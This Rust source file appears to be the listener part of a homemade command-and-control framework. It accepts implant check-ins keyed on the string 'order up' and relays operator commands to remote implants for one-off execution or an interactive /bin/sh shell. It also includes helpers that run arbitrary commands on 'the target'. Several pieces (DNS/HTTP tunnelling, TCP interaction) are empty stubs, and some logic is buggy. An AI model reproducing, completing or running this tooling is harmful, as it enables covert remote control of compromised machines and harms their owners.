use std::process::Command;
use std::net::{UdpSocket, SocketAddr, TcpListener, TcpStream, Shutdown};
use std::io::{Read, Write};
use std::format;

pub struct sysinfo {
    arch: String,
    os: String,
    hostname: String,
}

pub struct Listener {
    pub udp_sock: Option<UdpSocket>,
    pub tcp_sock: Option<TcpListener>,
    pub id: u64,
    // 0 for idle, 1 for listening, 2 for connected
    pub status: u8,
}

pub fn new_lsn(i: u64) -> Listener {
    let ret = Listener {
        udp_sock: None,
        tcp_sock: None,
        id: i,
        status: 0,
    };
    return ret;
}

pub fn lsn_run(lsn: &mut Listener, protocol: &str, address: SocketAddr, port: u16){
    match protocol {
        "udp" => listen_udp(lsn, address, port),
        "tcp" => listen_tcp(lsn, address, port),
        "http" => listen_tcp(lsn, address, port),
        "dns" => listen_udp(lsn, address, port),
        &_ => todo!(),
    }
}

// listens using a TcpListener
fn listen_tcp(lsn: &mut Listener, address: SocketAddr, port: u16){
    // Sets up the socket to relay data to the client over localhost
    let mut relay = UdpSocket::bind(SocketAddr::from(([127, 0, 0, 1], port))).unwrap();

    lsn.status = 1;
    lsn.tcp_sock = Some(TcpListener::bind(address).unwrap());
    println!("[+] Opening tcp listener on port {}", address.port());
    loop {
        let cmd: u8 = rcv_client_command(lsn, &mut relay);
        if cmd == 2 {
            break;
        }

        let acpt = lsn.tcp_sock.as_ref().expect("tcp listener not initialized").accept();
        match acpt {
            Ok((mut stream, _address)) => {
                let mut buffer = [0; 2048];
                let bytes = stream.read(&mut buffer[..]).unwrap();

                // replace insides of .contains() with whatever string/key we are using to verify connection
                if bytes != 0 && String::from_utf8_lossy(&buffer[..]).contains("order up") {
                    lsn.status = 2;
                    // switches to interact mode
                    interact_tcp(lsn, &mut stream, &mut relay);
                    lsn.status = 1;
                }
                stream.shutdown(Shutdown::Both).expect("shutdown call failed");
            }
            Err(e) => { /* Connection failed, nothing to do here. */ }
        }
    }
    lsn.status = 0;
}

// listens using a UdpSocket
fn listen_udp(lsn: &mut Listener, address: SocketAddr, port: u16){
    // Sets up the socket to relay data to the client over localhost
    let mut relay = UdpSocket::bind(SocketAddr::from(([127, 0, 0, 1], port))).unwrap();

    // Setup socket to listen for implant connection
    lsn.status = 1;
    lsn.udp_sock = Some(UdpSocket::bind(address).unwrap());
    println!("[+] Opening udp listener on port {}", address.port());
    loop { // break loop if connection is made
        // Checks for commands from the client each iteration
        let cmd: u8 = rcv_client_command(lsn, &mut relay);
        if cmd == 2 {
            break;
        }

        let mut buffer = [0; 2048];
        let (bytes, src) = lsn.udp_sock.as_ref().expect("udp socket not initialized").recv_from(&mut buffer).unwrap();

        // replace insides of .contains() with whatever string/key we are using to verify connection
        if bytes != 0 && String::from_utf8_lossy(&buffer[..]).contains("order up") {
            lsn.status = 2;
            // switches to interact mode
            interact_udp(lsn, src, &mut relay);
            lsn.status = 1;
        }
    }
    lsn.status = 0;
}

// handles interaction with the implant
// acts as a middleman between the implant and client
fn interact_udp(lsn: &mut Listener, target: SocketAddr, relay: &mut UdpSocket) {
    println!("[+] Connection established by listener {}", lsn.id);
    let mut is_interacting: bool = false;
    loop {
        // live interaction with the implant
        if is_interacting {
            let mut buffer = [0;2048];
            let (rbytes, relay_src) = relay.recv_from(&mut buffer).unwrap();
            // checks if client is terminating interaction with target_src
            if rbytes == 1 && buffer[0] == 6 {
                is_interacting = false;
                let code: u8 = 3;
                lsn.udp_sock.as_ref().expect("udp socket not initialized").send_to(&[code; 1], target);
            }
            // otherwise interact normally
            else if rbytes != 0 {
                // forward line to implant to execute on shell
                lsn.udp_sock.as_ref().expect("udp socket not initialized").send_to(&buffer[..], target);
                // recieve output and send it back to the client
                buffer = [0;2048];
                let (mut tbytes, mut target_src) = lsn.udp_sock.as_ref().expect("udp socket not initialized").recv_from(&mut buffer).unwrap();
                while tbytes == 0 && target_src != target {
                    // keep recieving data on socket until more than zero bytes are recieved from the correct address
                    buffer = [0;2048];
                    (tbytes, target_src) = lsn.udp_sock.as_ref().expect("udp socket not initialized").recv_from(&mut buffer).unwrap();
                }
                // forward output to client
                relay.send_to(&buffer[..], relay_src);
            }
        }
        else {
            // check for client commands
            let cc: u8 = rcv_client_command(lsn, relay);
            match cc {
                // go back to listening mode
                3 => {
                    // tell the implant to go dormant
                    let code: u8 = 69;
                    lsn.udp_sock.as_ref().expect("udp socket not initialized").send_to(&[code; 1], target);
                    return;
                },
                // send a single line command to the implant to execute
                4 => {
                    // recieve the string as bytes from the client
                    let mut buffer = [0;2048];
                    let (_rbytes, relay_src) = relay.recv_from(&mut buffer).unwrap();
                    // send control code to implant specifying single-line command execution
                    let code: u8 = 1;
                    lsn.udp_sock.as_ref().expect("udp socket not initialized").send_to(&[code; 1], target);
                    // forward the command to the implant
                    lsn.udp_sock.as_ref().expect("udp socket not initialized").send_to(&buffer[..], target);
                    // recieve the output from the implant
                    buffer = [0;2048];
                    let (mut tbytes, mut target_src) = lsn.udp_sock.as_ref().expect("udp socket not initialized").recv_from(&mut buffer).unwrap();
                    // forward output to client, making sure the network address of the implant is valid
                    while tbytes == 0 && target_src != target {
                        // keep recieving data on socket until more than zero bytes are recieved from the correct address
                        buffer = [0;2048];
                        (tbytes, target_src) = lsn.udp_sock.as_ref().expect("udp socket not initialized").recv_from(&mut buffer).unwrap();
                    }
                    // forward output to client
                    relay.send_to(&buffer[..], relay_src);
                },
                // tell implant to create a shell and begin interacting with it
                5 => {
                    is_interacting = true;
                    let code: u8 = 2;
                    lsn.udp_sock.as_ref().expect("udp socket not initialized").send_to(&[code; 1], target);
                },
                _u8 => todo!(),
            }
        }
    }
}

fn interact_tcp(lsn: &mut Listener, stream: &mut TcpStream, relay: &mut UdpSocket) {
    println!("[+] Connection established by listener {}", lsn.id);
    // TODO
}

// recieves a single byte from the client: the command code
// this command code, represented as an integer, determines
// what the client wants the listener to do
// anything not explicitly listed below => no command recieved, do nothing
// 1 => send all information about the listener
// 2 => stop listening
// 3 => terminate anchovy connection
// 4 => prepare to send_cmd to an anchovy
// 5 => begin shell on anchovy
// 6 => terminate shell on anchovy
fn rcv_client_command(lsn: &mut Listener, relay: &mut UdpSocket) -> u8 {
    let mut buffer = [0; 1];
    let (_bytes, _src) = relay.recv_from(&mut buffer).unwrap();
    // only action needed to be taken inside this function is to send back listener info
    if buffer[0] == 1 {
        let mut lsn_info = get_lsn_info(lsn);
        // TODO: send lsn_info back to client
    }
    return buffer[0];
}

// Returns a string containing the full info of a given listener
pub fn get_lsn_info(lsn: &mut Listener) -> String {
    let mut stat: &str;
    match lsn.status {
        0 => stat = "Idle",
        1 => stat = "Listening",
        2 => stat = "Bound",
        _u8 => todo!(),
    }
    let id: u64 = lsn.id;
    let mut lsn_info = format!("Listener {id} :: Status - {stat}");
    return lsn_info;
}

// Boiler function for encoding our commands into a dns packet
pub fn encode_dns(){

}

// Boiler function for encoding our commands into a http packet
pub fn encode_http(){

}


// Boiler function for decoding a dns packet for our code to read
pub fn decode_dns(){

}

// Boiler function for decoding an http packet into our own protocol
pub fn decode_http(){

}


// creates a shell on the target
pub fn shell() {
    if let Ok(command) = Command::new("/bin/sh").output(){
        println!("{}", String::from_utf8_lossy(&command.stdout));
    }
}

// executes a single arbitrary command
pub fn execute_cmd(s: String) -> String {
    if s.contains(' ') {
        let mut split = s.split_whitespace();
        let head = split.next().unwrap();
        let tail: Vec<&str> = split.collect();
        let cmd = Command::new(head).args(tail).output().unwrap();
        return String::from_utf8(cmd.stdout).expect("Found invalid UTF-8");
    }
    else {
        let cmd = Command::new(s).output().unwrap();
        return String::from_utf8(cmd.stdout).expect("Found invalid UTF-8");
    }
}
